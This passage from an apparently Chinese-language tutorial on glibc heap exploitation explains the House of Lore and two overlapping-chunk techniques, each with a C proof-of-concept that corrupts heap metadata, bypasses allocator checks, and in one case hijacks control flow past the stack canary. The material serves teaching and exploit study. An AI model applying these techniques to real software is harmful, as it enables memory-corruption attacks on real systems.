<p>如果glibc没有保护的话 只要修改释放后的chunk的fd指针 就可以向bin中任意添加chunk 但是现实总是残酷的 虽然glibc加的有防护 但是实际上是很好绕过的 它仅仅验证了 <code>victim->bk->fd=victim</code> 实际上这是很好伪造出来的 那么实例代码如下</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>

<span class="token keyword">void</span> <span class="token function">jackpot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Nice jump d00d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>


  intptr_t<span class="token operator">*</span> stack_buffer_1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  intptr_t<span class="token operator">*</span> stack_buffer_2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nWelcome to the House of Lore\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This is a revisited version that bypass also the hardening check introduced by glibc malloc\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating the victim chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  intptr_t <span class="token operator">*</span>victim <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocated the first small chunk on the heap at %p\n"</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment" spellcheck="true">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span>
  intptr_t <span class="token operator">*</span>victim_chdunk <span class="token operator">=</span> victim<span class="token number">-2</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_buffer_1 at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_buffer_2 at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_2<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Create a fake chunk on the stack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"</span>
         <span class="token string">"in second to the last malloc, which putting stack address on smallbin list\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> victim_chunk<span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "</span>
         <span class="token string">"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "</span>
         <span class="token string">"chunk on stack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>intptr_t<span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_2<span class="token punctuation">;</span>
  stack_buffer_2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>intptr_t<span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_1<span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating another large chunk in order to avoid consolidating the top chunk with"</span>
         <span class="token string">"the small one during the free()\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>p5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocated the large chunk on the heap at %p\n"</span><span class="token punctuation">,</span> p5<span class="token punctuation">)</span><span class="token punctuation">;</span>


  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nIn the unsorted bin the victim's fwd and bk pointers are nil\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->fwd: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->bk: %p\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This means that the chunk %p will be inserted in front of the SmallBin\n"</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">void</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n"</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The victim chunk has been sorted and its fwd and bk pointers updated\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->fwd: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->bk: %p\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment" spellcheck="true">//------------VULNERABILITY-----------</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now emulating a vulnerability that can overwrite the victim->bk pointer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>intptr_t<span class="token punctuation">)</span>stack_buffer_1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// victim->bk is pointing to stack</span>

  <span class="token comment" spellcheck="true">//------------------------------------</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now allocating a chunk with size equal to the first one freed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">void</span> <span class="token operator">*</span>p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p4 = malloc(100)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n"</span><span class="token punctuation">,</span>
         stack_buffer_2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\np4 is %p and should be on the stack!\n"</span><span class="token punctuation">,</span> p4<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// this chunk will be allocated on stack</span>
  intptr_t sc <span class="token operator">=</span> <span class="token punctuation">(</span>intptr_t<span class="token punctuation">)</span>jackpot<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Emulating our in-memory shellcode</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p4<span class="token operator">+</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sc<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// This bypasses stack-smash detection since it jumps over the canary</span>
<span class="token punctuation">}</span></code></pre>
<p>至于需要伪造两个chunk的原因是 当<code>stack_buffer_1</code>这个chunk被<code>malloc</code>的时候 会执行上述的检验流程 来检验他的<code>stack_buffer_1->bk->=stack_buffer_1</code> 所以需要伪造一个在stack_buffer_1之前的chunk来绕过检验</p>
<h3 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h3><p><code>overlapping_chunks</code>是一种修改<code>unsorted bin</code>中chunk的<code>size</code>字段 以达到后续<code>malloc</code>一个大chunk的时候 造成chunk重叠 案例如下</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token comment" spellcheck="true">// char a[10]="abc";</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>p1<span class="token punctuation">,</span><span class="token operator">*</span>p2<span class="token punctuation">,</span><span class="token operator">*</span>p3<span class="token punctuation">,</span><span class="token operator">*</span>p4<span class="token punctuation">;</span>
  p1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p2<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p3<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>p2<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0x1a0</span><span class="token punctuation">;</span>
  p4<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x190</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p~%p\n"</span><span class="token punctuation">,</span>p4<span class="token punctuation">,</span>p4<span class="token operator">+</span><span class="token number">0x190</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p~%p\n"</span><span class="token punctuation">,</span>p3<span class="token punctuation">,</span>p3<span class="token operator">+</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span></code></pre>
<p>需要注意的是 修改<code>size</code>字段的时候 要含上p2和p3的chunk头大小 后续<code>malloc</code>的时候也是</p>
<h3 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h3><p>这个案例的效果和上面是一样的 但是他的区别就是 这个修改<code>size</code>字段是在chunk被<code>free</code>之前 利用chunk的合并机制进行覆盖</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*
 Yet another simple tale of overlapping chunk.

 This technique is taken from
 https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.

 This is also referenced as Nonadjacent Free Chunk Consolidation Attack.

*/</span>

<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

  intptr_t <span class="token operator">*</span>p1<span class="token punctuation">,</span><span class="token operator">*</span>p2<span class="token punctuation">,</span><span class="token operator">*</span>p3<span class="token punctuation">,</span><span class="token operator">*</span>p4<span class="token punctuation">,</span><span class="token operator">*</span>p5<span class="token punctuation">,</span><span class="token operator">*</span>p6<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> real_size_p1<span class="token punctuation">,</span>real_size_p2<span class="token punctuation">,</span>real_size_p3<span class="token punctuation">,</span>real_size_p4<span class="token punctuation">,</span>real_size_p5<span class="token punctuation">,</span>real_size_p6<span class="token punctuation">;</span>
  <span class="token keyword">int</span> prev_in_use <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThis is a simple chunks overlapping problem"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nLet's start to allocate 5 chunks on the heap:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  real_size_p1 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  real_size_p2 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  real_size_p3 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  real_size_p4 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  real_size_p5 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p5<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\n\nchunk p1 from %p to %p"</span><span class="token punctuation">,</span> p1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p1<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p2 from %p to %p"</span><span class="token punctuation">,</span> p2<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p2<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p3 from %p to %p"</span><span class="token punctuation">,</span> p3<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p4 from %p to %p"</span><span class="token punctuation">,</span> p4<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p5 from %p to %p\n"</span><span class="token punctuation">,</span> p5<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p5<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">memset</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span>real_size_p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>p2<span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span>real_size_p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>p3<span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span>real_size_p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>p4<span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span>real_size_p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>p5<span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">,</span>real_size_p5<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nLet's free the chunk p4.\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

  <span class="token function">free</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p1 <span class="token operator">+</span> real_size_p1 <span class="token punctuation">)</span> <span class="token operator">=</span> real_size_p2 <span class="token operator">+</span> real_size_p3 <span class="token operator">+</span> prev_in_use <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//&lt;--- BUG HERE </span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThis operation will basically create a big free chunk that wrongly includes p3\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  p6 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  real_size_p6 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p6<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p6 from %p to %p"</span><span class="token punctuation">,</span> p6<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p6<span class="token operator">+</span>real_size_p6<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p3 from %p to %p\n"</span><span class="token punctuation">,</span> p3<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> p3<span class="token operator">+</span>real_size_p3<span class="token punctuation">)</span><span class="token punctuation">;</span> 

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nData inside chunk p3: \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span> 

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nLet's write something inside p6\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>p6<span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token number">1500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

